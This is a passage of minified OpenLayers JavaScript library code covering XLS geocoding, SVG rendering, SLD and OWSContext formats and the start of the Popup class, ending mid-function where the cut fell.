c=this.createElementNS(this.namespaces.sld,"sld:MinScaleDenominator");c.appendChild(this.createTextNode(a.maxScale.toPrecision(16)));b.appendChild(c)}a.minScale&amp;&amp;(c=this.createElementNS(this.namespaces.sld,"sld:MaxScaleDenominator"),c.appendChild(this.createTextNode(a.minScale.toPrecision(16))),b.appendChild(c));if(a.srs)for(var d in a.srs)b.appendChild(this.createElementDefaultNS("SRS", d));b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&amp;&amp;b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a));return b},CLASS_NAME:"OpenLayers.Format.WMC.v1_1_0"});OpenLayers.Format.XLS=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.0",stringifyOutput:!0,CLASS_NAME:"OpenLayers.Format.XLS"});OpenLayers.Format.XLS.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xls:"http://www.opengis.net/xls",gml:"http://www.opengis.net/gml",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},xy:!0,defaultPrefix:"xls",schemaLocation:null,read:function(a,b){OpenLayers.Util.applyDefaults(b,this.options);var c={};this.readChildNodes(a,c);return c},readers:{xls:{XLS:function(a,b){b.version=a.getAttribute("version"); this.readChildNodes(a,b)},Response:function(a,b){this.readChildNodes(a,b)},GeocodeResponse:function(a,b){b.responseLists=[];this.readChildNodes(a,b)},GeocodeResponseList:function(a,b){var c={features:[],numberOfGeocodedAddresses:parseInt(a.getAttribute("numberOfGeocodedAddresses"))};b.responseLists.push(c);this.readChildNodes(a,c)},GeocodedAddress:function(a,b){var c=new OpenLayers.Feature.Vector;b.features.push(c);this.readChildNodes(a,c);c.geometry=c.components[0]},GeocodeMatchCode:function(a,b){b.attributes.matchCode= {accuracy:parseFloat(a.getAttribute("accuracy")),matchType:a.getAttribute("matchType")}},Address:function(a,b){var c={countryCode:a.getAttribute("countryCode"),addressee:a.getAttribute("addressee"),street:[],place:[]};b.attributes.address=c;this.readChildNodes(a,c)},freeFormAddress:function(a,b){b.freeFormAddress=this.getChildValue(a)},StreetAddress:function(a,b){this.readChildNodes(a,b)},Building:function(a,b){b.building={number:a.getAttribute("number"),subdivision:a.getAttribute("subdivision"), buildingName:a.getAttribute("buildingName")}},Street:function(a,b){b.street.push(this.getChildValue(a))},Place:function(a,b){b.place[a.getAttribute("type")]=this.getChildValue(a)},PostalCode:function(a,b){b.postalCode=this.getChildValue(a)}},gml:OpenLayers.Format.GML.v3.prototype.readers.gml},write:function(a){return this.writers.xls.XLS.apply(this,[a])},writers:{xls:{XLS:function(a){var b=this.createElementNSPlus("xls:XLS",{attributes:{version:this.VERSION,"xsi:schemaLocation":this.schemaLocation}}); this.writeNode("RequestHeader",a.header,b);this.writeNode("Request",a,b);return b},RequestHeader:function(a){return this.createElementNSPlus("xls:RequestHeader")},Request:function(a){var b=this.createElementNSPlus("xls:Request",{attributes:{methodName:"GeocodeRequest",requestID:a.requestID||"",version:this.VERSION}});this.writeNode("GeocodeRequest",a.addresses,b);return b},GeocodeRequest:function(a){for(var b=this.createElementNSPlus("xls:GeocodeRequest"),c=0,d=a.length;c&lt;d;c++)this.writeNode("Address", a[c],b);return b},Address:function(a){var b=this.createElementNSPlus("xls:Address",{attributes:{countryCode:a.countryCode}});a.freeFormAddress?this.writeNode("freeFormAddress",a.freeFormAddress,b):(a.street&amp;&amp;this.writeNode("StreetAddress",a,b),a.municipality&amp;&amp;this.writeNode("Municipality",a.municipality,b),a.countrySubdivision&amp;&amp;this.writeNode("CountrySubdivision",a.countrySubdivision,b),a.postalCode&amp;&amp;this.writeNode("PostalCode",a.postalCode,b));return b},freeFormAddress:function(a){return this.createElementNSPlus("freeFormAddress", {value:a})},StreetAddress:function(a){var b=this.createElementNSPlus("xls:StreetAddress");a.building&amp;&amp;this.writeNode(b,"Building",a.building);a=a.street;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=0,d=a.length;c&lt;d;c++)this.writeNode("Street",a[c],b);return b},Building:function(a){return this.createElementNSPlus("xls:Building",{attributes:{number:a.number,subdivision:a.subdivision,buildingName:a.buildingName}})},Street:function(a){return this.createElementNSPlus("xls:Street",{value:a})},Municipality:function(a){return this.createElementNSPlus("xls:Place", {attributes:{type:"Municipality"},value:a})},CountrySubdivision:function(a){return this.createElementNSPlus("xls:Place",{attributes:{type:"CountrySubdivision"},value:a})},PostalCode:function(a){return this.createElementNSPlus("xls:PostalCode",{value:a})}}},CLASS_NAME:"OpenLayers.Format.XLS.v1"});OpenLayers.Format.XLS.v1_1_0=OpenLayers.Class(OpenLayers.Format.XLS.v1,{VERSION:"1.1",schemaLocation:"http://www.opengis.net/xls http://schemas.opengis.net/ols/1.1.0/LocationUtilityService.xsd",CLASS_NAME:"OpenLayers.Format.XLS.v1_1_0"});OpenLayers.Format.XLS.v1_1=OpenLayers.Format.XLS.v1_1_0;OpenLayers.Renderer.SVG=OpenLayers.Class(OpenLayers.Renderer.Elements,{xmlns:"http://www.w3.org/2000/svg",xlinkns:"http://www.w3.org/1999/xlink",MAX_PIXEL:15E3,translationParameters:null,symbolMetrics:null,initialize:function(a){this.supported()&amp;&amp;(OpenLayers.Renderer.Elements.prototype.initialize.apply(this,arguments),this.translationParameters={x:0,y:0},this.symbolMetrics={})},supported:function(){return document.implementation&amp;&amp;(document.implementation.hasFeature("org.w3c.svg","1.0")||document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#SVG", "1.1")||document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#BasicStructure","1.1"))},inValidRange:function(a,b,c){a+=c?0:this.translationParameters.x;b+=c?0:this.translationParameters.y;return a>=-this.MAX_PIXEL&amp;&amp;a&lt;=this.MAX_PIXEL&amp;&amp;b>=-this.MAX_PIXEL&amp;&amp;b&lt;=this.MAX_PIXEL},setExtent:function(a,b){var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=-a.left/d,d=a.top/d;if(b)return this.left=e,this.top=d,this.rendererRoot.setAttributeNS(null, "viewBox","0 0 "+this.size.w+" "+this.size.h),this.translate(this.xOffset,0),!0;(e=this.translate(e-this.left+this.xOffset,d-this.top))||this.setExtent(a,!0);return c&amp;&amp;e},translate:function(a,b){if(this.inValidRange(a,b,!0)){var c="";if(a||b)c="translate("+a+","+b+")";this.root.setAttributeNS(null,"transform",c);this.translationParameters={x:a,y:b};return!0}return!1},setSize:function(a){OpenLayers.Renderer.prototype.setSize.apply(this,arguments);this.rendererRoot.setAttributeNS(null,"width",this.size.w); this.rendererRoot.setAttributeNS(null,"height",this.size.h)},getNodeType:function(a,b){var c=null;switch(a.CLASS_NAME){case "OpenLayers.Geometry.Point":c=b.externalGraphic?"image":this.isComplexSymbol(b.graphicName)?"svg":"circle";break;case "OpenLayers.Geometry.Rectangle":c="rect";break;case "OpenLayers.Geometry.LineString":c="polyline";break;case "OpenLayers.Geometry.LinearRing":c="polygon";break;case "OpenLayers.Geometry.Polygon":case "OpenLayers.Geometry.Curve":c="path"}return c},setStyle:function(a, b,c){b=b||a._style;c=c||a._options;var d=b.title||b.graphicTitle;if(d){a.setAttributeNS(null,"title",d);var e=a.getElementsByTagName("title");0&lt;e.length?e[0].firstChild.textContent=d:(e=this.nodeFactory(null,"title"),e.textContent=d,a.appendChild(e))}var e=parseFloat(a.getAttributeNS(null,"r")),d=1,f;if("OpenLayers.Geometry.Point"==a._geometryClass&amp;&amp;e){a.style.visibility="";if(!1===b.graphic)a.style.visibility="hidden";else if(b.externalGraphic){f=this.getPosition(a);b.graphicWidth&amp;&amp;b.graphicHeight&amp;&amp; a.setAttributeNS(null,"preserveAspectRatio","none");var e=b.graphicWidth||b.graphicHeight,g=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,g=g?g:2*b.pointRadius,h=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*g),k=b.graphicOpacity||b.fillOpacity;a.setAttributeNS(null,"x",(f.x+(void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e))).toFixed());a.setAttributeNS(null,"y",(f.y+h).toFixed());a.setAttributeNS(null,"width",e);a.setAttributeNS(null,"height",g);a.setAttributeNS(this.xlinkns,"xlink:href", b.externalGraphic);a.setAttributeNS(null,"style","opacity: "+k);a.onclick=OpenLayers.Event.preventDefault}else if(this.isComplexSymbol(b.graphicName)){var e=3*b.pointRadius,g=2*e,l=this.importSymbol(b.graphicName);f=this.getPosition(a);d=3*this.symbolMetrics[l.id][0]/g;h=a.parentNode;k=a.nextSibling;h&amp;&amp;h.removeChild(a);a.firstChild&amp;&amp;a.removeChild(a.firstChild);a.appendChild(l.firstChild.cloneNode(!0));a.setAttributeNS(null,"viewBox",l.getAttributeNS(null,"viewBox"));a.setAttributeNS(null,"width", g);a.setAttributeNS(null,"height",g);a.setAttributeNS(null,"x",f.x-e);a.setAttributeNS(null,"y",f.y-e);k?h.insertBefore(a,k):h&amp;&amp;h.appendChild(a)}else a.setAttributeNS(null,"r",b.pointRadius);e=b.rotation;void 0===e&amp;&amp;void 0===a._rotation||!f||(a._rotation=e,e|=0,"svg"!==a.nodeName?a.setAttributeNS(null,"transform","rotate("+e+" "+f.x+" "+f.y+")"):(f=this.symbolMetrics[l.id],a.firstChild.setAttributeNS(null,"transform","rotate("+e+" "+f[1]+" "+f[2]+")")))}c.isFilled?(a.setAttributeNS(null,"fill",b.fillColor), a.setAttributeNS(null,"fill-opacity",b.fillOpacity)):a.setAttributeNS(null,"fill","none");c.isStroked?(a.setAttributeNS(null,"stroke",b.strokeColor),a.setAttributeNS(null,"stroke-opacity",b.strokeOpacity),a.setAttributeNS(null,"stroke-width",b.strokeWidth*d),a.setAttributeNS(null,"stroke-linecap",b.strokeLinecap||"round"),a.setAttributeNS(null,"stroke-linejoin","round"),b.strokeDashstyle&amp;&amp;a.setAttributeNS(null,"stroke-dasharray",this.dashStyle(b,d))):a.setAttributeNS(null,"stroke","none");b.pointerEvents&amp;&amp; a.setAttributeNS(null,"pointer-events",b.pointerEvents);null!=b.cursor&amp;&amp;a.setAttributeNS(null,"cursor",b.cursor);return a},dashStyle:function(a,b){var c=a.strokeWidth*b,d=a.strokeDashstyle;switch(d){case "solid":return"none";case "dot":return[1,4*c].join();case "dash":return[4*c,4*c].join();case "dashdot":return[4*c,4*c,1,4*c].join();case "longdash":return[8*c,4*c].join();case "longdashdot":return[8*c,4*c,1,4*c].join();default:return OpenLayers.String.trim(d).replace(/\s+/g,",")}},createNode:function(a, b){var c=document.createElementNS(this.xmlns,a);b&amp;&amp;c.setAttributeNS(null,"id",b);return c},nodeTypeCompare:function(a,b){return b==a.nodeName},createRenderRoot:function(){var a=this.nodeFactory(this.container.id+"_svgRoot","svg");a.style.display="block";return a},createRoot:function(a){return this.nodeFactory(this.container.id+a,"g")},createDefs:function(){var a=this.nodeFactory(this.container.id+"_defs","defs");this.rendererRoot.appendChild(a);return a},drawPoint:function(a,b){return this.drawCircle(a, b,1)},drawCircle:function(a,b,c){var d=this.getResolution(),e=(b.x-this.featureDx)/d+this.left;b=this.top-b.y/d;return this.inValidRange(e,b)?(a.setAttributeNS(null,"cx",e),a.setAttributeNS(null,"cy",b),a.setAttributeNS(null,"r",c),a):!1},drawLineString:function(a,b){var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null,"points",c.path),c.complete?a:null):!1},drawLinearRing:function(a,b){var c=this.getComponentsString(b.components);return c.path?(a.setAttributeNS(null, "points",c.path),c.complete?a:null):!1},drawPolygon:function(a,b){for(var c="",d=!0,e=!0,f,g,h=0,k=b.components.length;h&lt;k;h++)c+=" M",f=this.getComponentsString(b.components[h].components," "),(g=f.path)?(c+=" "+g,e=f.complete&amp;&amp;e):d=!1;return d?(a.setAttributeNS(null,"d",c+" z"),a.setAttributeNS(null,"fill-rule","evenodd"),e?a:null):!1},drawRectangle:function(a,b){var c=this.getResolution(),d=(b.x-this.featureDx)/c+this.left,e=this.top-b.y/c;return this.inValidRange(d,e)?(a.setAttributeNS(null,"x", d),a.setAttributeNS(null,"y",e),a.setAttributeNS(null,"width",b.width/c),a.setAttributeNS(null,"height",b.height/c),a):!1},drawText:function(a,b,c){var d=!!b.labelOutlineWidth;if(d){var e=OpenLayers.Util.extend({},b);e.fontColor=e.labelOutlineColor;e.fontStrokeColor=e.labelOutlineColor;e.fontStrokeWidth=b.labelOutlineWidth;b.labelOutlineOpacity&amp;&amp;(e.fontOpacity=b.labelOutlineOpacity);delete e.labelOutlineWidth;this.drawText(a,e,c)}var f=this.getResolution(),e=(c.x-this.featureDx)/f+this.left,g=c.y/ f-this.top,d=d?this.LABEL_OUTLINE_SUFFIX:this.LABEL_ID_SUFFIX,f=this.nodeFactory(a+d,"text");f.setAttributeNS(null,"x",e);f.setAttributeNS(null,"y",-g);b.fontColor&amp;&amp;f.setAttributeNS(null,"fill",b.fontColor);b.fontStrokeColor&amp;&amp;f.setAttributeNS(null,"stroke",b.fontStrokeColor);b.fontStrokeWidth&amp;&amp;f.setAttributeNS(null,"stroke-width",b.fontStrokeWidth);b.fontOpacity&amp;&amp;f.setAttributeNS(null,"opacity",b.fontOpacity);b.fontFamily&amp;&amp;f.setAttributeNS(null,"font-family",b.fontFamily);b.fontSize&amp;&amp;f.setAttributeNS(null, "font-size",b.fontSize);b.fontWeight&amp;&amp;f.setAttributeNS(null,"font-weight",b.fontWeight);b.fontStyle&amp;&amp;f.setAttributeNS(null,"font-style",b.fontStyle);!0===b.labelSelect?(f.setAttributeNS(null,"pointer-events","visible"),f._featureId=a):f.setAttributeNS(null,"pointer-events","none");g=b.labelAlign||OpenLayers.Renderer.defaultSymbolizer.labelAlign;f.setAttributeNS(null,"text-anchor",OpenLayers.Renderer.SVG.LABEL_ALIGN[g[0]]||"middle");!0===OpenLayers.IS_GECKO&amp;&amp;f.setAttributeNS(null,"dominant-baseline", OpenLayers.Renderer.SVG.LABEL_ALIGN[g[1]]||"central");for(var h=b.label.split("\n"),k=h.length;f.childNodes.length>k;)f.removeChild(f.lastChild);for(var l=0;l&lt;k;l++){var m=this.nodeFactory(a+d+"_tspan_"+l,"tspan");!0===b.labelSelect&amp;&amp;(m._featureId=a,m._geometry=c,m._geometryClass=c.CLASS_NAME);!1===OpenLayers.IS_GECKO&amp;&amp;m.setAttributeNS(null,"baseline-shift",OpenLayers.Renderer.SVG.LABEL_VSHIFT[g[1]]||"-35%");m.setAttribute("x",e);if(0==l){var n=OpenLayers.Renderer.SVG.LABEL_VFACTOR[g[1]];null==n&amp;&amp; (n=-0.5);m.setAttribute("dy",n*(k-1)+"em")}else m.setAttribute("dy","1em");m.textContent=""===h[l]?" ":h[l];m.parentNode||f.appendChild(m)}f.parentNode||this.textRoot.appendChild(f)},getComponentsString:function(a,b){for(var c=[],d=!0,e=a.length,f=[],g,h=0;h&lt;e;h++)g=a[h],c.push(g),(g=this.getShortString(g))?f.push(g):(0&lt;h&amp;&amp;this.getShortString(a[h-1])&amp;&amp;f.push(this.clipLine(a[h],a[h-1])),h&lt;e-1&amp;&amp;this.getShortString(a[h+1])&amp;&amp;f.push(this.clipLine(a[h],a[h+1])),d=!1);return{path:f.join(b||","),complete:d}}, clipLine:function(a,b){if(b.equals(a))return"";var c=this.getResolution(),d=this.MAX_PIXEL-this.translationParameters.x,e=this.MAX_PIXEL-this.translationParameters.y,f=(b.x-this.featureDx)/c+this.left,g=this.top-b.y/c,h=(a.x-this.featureDx)/c+this.left,c=this.top-a.y/c,k;if(h&lt;-d||h>d)k=(c-g)/(h-f),h=0>h?-d:d,c=g+(h-f)*k;if(c&lt;-e||c>e)k=(h-f)/(c-g),c=0>c?-e:e,h=f+(c-g)*k;return h+","+c},getShortString:function(a){var b=this.getResolution(),c=(a.x-this.featureDx)/b+this.left;a=this.top-a.y/b;return this.inValidRange(c, a)?c+","+a:!1},getPosition:function(a){return{x:parseFloat(a.getAttributeNS(null,"cx")),y:parseFloat(a.getAttributeNS(null,"cy"))}},importSymbol:function(a){this.defs||(this.defs=this.createDefs());var b=this.container.id+"-"+a,c=document.getElementById(b);if(null!=c)return c;var d=OpenLayers.Renderer.symbol[a];if(!d)throw Error(a+" is not a valid symbol name");a=this.nodeFactory(b,"symbol");var e=this.nodeFactory(null,"polygon");a.appendChild(e);for(var c=new OpenLayers.Bounds(Number.MAX_VALUE,Number.MAX_VALUE, 0,0),f=[],g,h,k=0;k&lt;d.length;k+=2)g=d[k],h=d[k+1],c.left=Math.min(c.left,g),c.bottom=Math.min(c.bottom,h),c.right=Math.max(c.right,g),c.top=Math.max(c.top,h),f.push(g,",",h);e.setAttributeNS(null,"points",f.join(" "));d=c.getWidth();e=c.getHeight();a.setAttributeNS(null,"viewBox",[c.left-d,c.bottom-e,3*d,3*e].join(" "));this.symbolMetrics[b]=[Math.max(d,e),c.getCenterLonLat().lon,c.getCenterLonLat().lat];this.defs.appendChild(a);return a},getFeatureIdFromEvent:function(a){var b=OpenLayers.Renderer.Elements.prototype.getFeatureIdFromEvent.apply(this, arguments);b||(b=a.target,b=b.parentNode&amp;&amp;b!=this.rendererRoot?b.parentNode._featureId:void 0);return b},CLASS_NAME:"OpenLayers.Renderer.SVG"});OpenLayers.Renderer.SVG.LABEL_ALIGN={l:"start",r:"end",b:"bottom",t:"hanging"};OpenLayers.Renderer.SVG.LABEL_VSHIFT={t:"-70%",b:"0"};OpenLayers.Renderer.SVG.LABEL_VFACTOR={t:0,b:-1};OpenLayers.Renderer.SVG.preventDefault=function(a){OpenLayers.Event.preventDefault(a)};OpenLayers.Format.SLD.v1_0_0=OpenLayers.Class(OpenLayers.Format.SLD.v1,{VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/sld http://schemas.opengis.net/sld/1.0.0/StyledLayerDescriptor.xsd",CLASS_NAME:"OpenLayers.Format.SLD.v1_0_0"});OpenLayers.Format.OWSContext=OpenLayers.Class(OpenLayers.Format.Context,{defaultVersion:"0.3.1",getVersion:function(a,b){var c=OpenLayers.Format.XML.VersionedOGC.prototype.getVersion.apply(this,arguments);"0.3.0"===c&amp;&amp;(c=this.defaultVersion);return c},toContext:function(a){var b={};"OpenLayers.Map"==a.CLASS_NAME&amp;&amp;(b.bounds=a.getExtent(),b.maxExtent=a.maxExtent,b.projection=a.projection,b.size=a.getSize(),b.layers=a.layers);return b},CLASS_NAME:"OpenLayers.Format.OWSContext"});OpenLayers.Format.OWSContext.v0_3_1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{owc:"http://www.opengis.net/ows-context",gml:"http://www.opengis.net/gml",kml:"http://www.opengis.net/kml/2.2",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows",sld:"http://www.opengis.net/sld",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},VERSION:"0.3.1",schemaLocation:"http://www.opengis.net/ows-context http://www.ogcnetwork.net/schemas/owc/0.3.1/owsContext.xsd", defaultPrefix:"owc",extractAttributes:!0,xy:!0,regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},featureNS:"http://mapserver.gis.umn.edu/mapserver",featureType:"vector",geometryName:"geometry",nestingLayerLookup:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);OpenLayers.Format.GML.v2.prototype.setGeometryTypes.call(this)},setNestingPath:function(a){if(a.layersContext)for(var b=0,c=a.layersContext.length;b&lt;c;b++){var d= a.layersContext[b],e=[],f=a.title||"";a.metadata&amp;&amp;a.metadata.nestingPath&amp;&amp;(e=a.metadata.nestingPath.slice());""!=f&amp;&amp;e.push(f);d.metadata.nestingPath=e;d.layersContext&amp;&amp;this.setNestingPath(d)}},decomposeNestingPath:function(a){var b=[];if(OpenLayers.Util.isArray(a)){for(a=a.slice();0&lt;a.length;)b.push(a.slice()),a.pop();b.reverse()}return b},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a, b);this.setNestingPath({layersContext:b.layersContext});a=[];this.processLayer(a,b);delete b.layersContext;b.layersContext=a;return b},processLayer:function(a,b){if(b.layersContext)for(var c=0,d=b.layersContext.length;c&lt;d;c++){var e=b.layersContext[c];a.push(e);e.layersContext&amp;&amp;this.processLayer(a,e)}},write:function(a,b){this.nestingLayerLookup={};b=b||{};OpenLayers.Util.applyDefaults(b,a);var c=this.writeNode("OWSContext",b);this.nestingLayerLookup=null;this.setAttributeNS(c,this.namespaces.xsi, "xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[c])},readers:{kml:{Document:function(a,b){b.features=(new OpenLayers.Format.KML({kmlns:this.namespaces.kml,extractStyles:!0})).read(a)}},owc:{OWSContext:function(a,b){this.readChildNodes(a,b)},General:function(a,b){this.readChildNodes(a,b)},ResourceList:function(a,b){this.readChildNodes(a,b)},Layer:function(a,b){var c={metadata:{},visibility:"1"!=a.getAttribute("hidden"),queryable:"1"==a.getAttribute("queryable"), opacity:null!=a.getAttribute("opacity")?parseFloat(a.getAttribute("opacity")):null,name:a.getAttribute("name"),categoryLayer:null==a.getAttribute("name"),formats:[],styles:[]};b.layersContext||(b.layersContext=[]);b.layersContext.push(c);this.readChildNodes(a,c)},InlineGeometry:function(a,b){b.features=[];var c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMember"),d;1&lt;=c.length&amp;&amp;(d=c[0]);d&amp;&amp;d.firstChild&amp;&amp;(c=d.firstChild.nextSibling?d.firstChild.nextSibling:d.firstChild,this.setNamespace("feature", c.namespaceURI),this.featureType=c.localName||c.nodeName.split(":").pop(),this.readChildNodes(a,b))},Server:function(a,b){if(!b.service&amp;&amp;!b.version||b.service!=OpenLayers.Format.Context.serviceTypes.WMS)b.service=a.getAttribute("service"),b.version=a.getAttribute("version"),this.readChildNodes(a,b)},Name:function(a,b){b.name=this.getChildValue(a);this.readChildNodes(a,b)},Title:function(a,b){b.title=this.getChildValue(a);this.readChildNodes(a,b)},StyleList:function(a,b){this.readChildNodes(a,b.styles)}, Style:function(a,b){var c={};b.push(c);this.readChildNodes(a,c)},LegendURL:function(a,b){var c={};b.legend=c;this.readChildNodes(a,c)},OnlineResource:function(a,b){b.url=this.getAttributeNS(a,this.namespaces.xlink,"href");this.readChildNodes(a,b)}},ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows,gml:OpenLayers.Format.GML.v2.prototype.readers.gml,sld:OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld,feature:OpenLayers.Format.GML.v2.prototype.readers.feature},writers:{owc:{OWSContext:function(a){var b= this.createElementNSPlus("OWSContext",{attributes:{version:this.VERSION,id:a.id||OpenLayers.Util.createUniqueID("OpenLayers_OWSContext_")}});this.writeNode("General",a,b);this.writeNode("ResourceList",a,b);return b},General:function(a){var b=this.createElementNSPlus("General");this.writeNode("ows:BoundingBox",a,b);this.writeNode("ows:Title",a.title||"OpenLayers OWSContext",b);return b},ResourceList:function(a){for(var b=this.createElementNSPlus("ResourceList"),c=0,d=a.layers.length;c&lt;d;c++){var e= a.layers[c],f=this.decomposeNestingPath(e.metadata.nestingPath);this.writeNode("_Layer",{layer:e,subPaths:f},b)}return b},Server:function(a){var b=this.createElementNSPlus("Server",{attributes:{version:a.version,service:a.service}});this.writeNode("OnlineResource",a,b);return b},OnlineResource:function(a){return this.createElementNSPlus("OnlineResource",{attributes:{"xlink:href":a.url}})},InlineGeometry:function(a){var b=this.createElementNSPlus("InlineGeometry"),c=a.getDataExtent();null!==c&amp;&amp;this.writeNode("gml:boundedBy", c,b);for(var c=0,d=a.features.length;c&lt;d;c++)this.writeNode("gml:featureMember",a.features[c],b);return b},StyleList:function(a){for(var b=this.createElementNSPlus("StyleList"),c=0,d=a.length;c&lt;d;c++)this.writeNode("Style",a[c],b);return b},Style:function(a){var b=this.createElementNSPlus("Style");this.writeNode("Name",a,b);this.writeNode("Title",a,b);a.legend&amp;&amp;this.writeNode("LegendURL",a,b);return b},Name:function(a){return this.createElementNSPlus("Name",{value:a.name})},Title:function(a){return this.createElementNSPlus("Title", {value:a.title})},LegendURL:function(a){var b=this.createElementNSPlus("LegendURL");this.writeNode("OnlineResource",a.legend,b);return b},_WMS:function(a){var b=this.createElementNSPlus("Layer",{attributes:{name:a.params.LAYERS,queryable:a.queryable?"1":"0",hidden:a.visibility?"0":"1",opacity:a.hasOwnProperty("opacity")?a.opacity:null}});this.writeNode("ows:Title",a.name,b);this.writeNode("ows:OutputFormat",a.params.FORMAT,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.WMS, version:a.params.VERSION,url:a.url},b);a.metadata.styles&amp;&amp;0&lt;a.metadata.styles.length&amp;&amp;this.writeNode("StyleList",a.metadata.styles,b);return b},_Layer:function(a){var b,c,d;b=a.layer;c=a.subPaths;d=null;0&lt;c.length?(b=c[0].join("/"),c=b.lastIndexOf("/"),d=this.nestingLayerLookup[b],c=0&lt;c?b.substring(c+1,b.length):b,d||(d=this.createElementNSPlus("Layer"),this.writeNode("ows:Title",c,d),this.nestingLayerLookup[b]=d),a.subPaths.shift(),this.writeNode("_Layer",a,d)):(b instanceof OpenLayers.Layer.WMS? d=this.writeNode("_WMS",b):b instanceof OpenLayers.Layer.Vector&amp;&amp;(b.protocol instanceof OpenLayers.Protocol.WFS.v1?d=this.writeNode("_WFS",b):b.protocol instanceof OpenLayers.Protocol.HTTP?b.protocol.format instanceof OpenLayers.Format.GML?(b.protocol.format.version="2.1.2",d=this.writeNode("_GML",b)):b.protocol.format instanceof OpenLayers.Format.KML&amp;&amp;(b.protocol.format.version="2.2",d=this.writeNode("_KML",b)):(this.setNamespace("feature",this.featureNS),d=this.writeNode("_InlineGeometry",b))), b.options.maxScale&amp;&amp;this.writeNode("sld:MinScaleDenominator",b.options.maxScale,d),b.options.minScale&amp;&amp;this.writeNode("sld:MaxScaleDenominator",b.options.minScale,d),this.nestingLayerLookup[b.name]=d);return d},_WFS:function(a){var b=this.createElementNSPlus("Layer",{attributes:{name:a.protocol.featurePrefix+":"+a.protocol.featureType,hidden:a.visibility?"0":"1"}});this.writeNode("ows:Title",a.name,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.WFS,version:a.protocol.version, url:a.protocol.url},b);return b},_InlineGeometry:function(a){var b=this.createElementNSPlus("Layer",{attributes:{name:this.featureType,hidden:a.visibility?"0":"1"}});this.writeNode("ows:Title",a.name,b);this.writeNode("InlineGeometry",a,b);return b},_GML:function(a){var b=this.createElementNSPlus("Layer");this.writeNode("ows:Title",a.name,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.GML,url:a.protocol.url,version:a.protocol.format.version},b);return b},_KML:function(a){var b= this.createElementNSPlus("Layer");this.writeNode("ows:Title",a.name,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.KML,version:a.protocol.format.version,url:a.protocol.url},b);return b}},gml:OpenLayers.Util.applyDefaults({boundedBy:function(a){var b=this.createElementNSPlus("gml:boundedBy");this.writeNode("gml:Box",a,b);return b}},OpenLayers.Format.GML.v2.prototype.writers.gml),ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.writers.ows,sld:OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld, feature:OpenLayers.Format.GML.v2.prototype.writers.feature},CLASS_NAME:"OpenLayers.Format.OWSContext.v0_3_1"});OpenLayers.Popup=OpenLayers.Class({events:null,id:"",lonlat:null,div:null,contentSize:null,size:null,contentHTML:null,backgroundColor:"",opacity:"",border:"",contentDiv:null,groupDiv:null,closeDiv:null,autoSize:!1,minSize:null,maxSize:null,displayClass:"olPopup",contentDisplayClass:"olPopupContent",padding:0,disableFirefoxOverflowHack:!1,fixPadding:function(){"number"==typeof this.padding&amp;&amp;(this.padding=new OpenLayers.Bounds(this.padding,this.padding,this.padding,this.padding))},panMapIfOutOfView:!1, keepInMap:!1,closeOnMove:!1,map:null,initialize:function(a,b,c,d,e,f){null==a&amp;&amp;(a=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_"));this.id=a;this.lonlat=b;this.contentSize=null!=c?c:new OpenLayers.Size(OpenLayers.Popup.WIDTH,OpenLayers.Popup.HEIGHT);null!=d&amp;&amp;(this.contentHTML=d);this.backgroundColor=OpenLayers.Popup.COLOR;this.opacity=OpenLayers.Popup.OPACITY;this.border=OpenLayers.Popup.BORDER;this.div=OpenLayers.Util.createDiv(this.id,null,null,null,null,null,"hidden");this.div.className=this.displayClass; this.groupDiv=OpenLayers.Util.createDiv(this.id+"_GroupDiv",null,null,null,"relative",null,"hidden");a=this.div.id+"_contentDiv";this.contentDiv=OpenLayers.Util.createDiv(a,null,this.contentSize.clone(),null,"relative");this.contentDiv.className=this.contentDisplayClass;this.groupDiv.appendChild(this.contentDiv);this.div.appendChild(this.groupDiv);e&amp;&amp;this.addCloseBox(f);this.registerEvents()},destroy:function(){this.border=this.opacity=this.backgroundColor=this.contentHTML=this.size=this.lonlat=this.id= 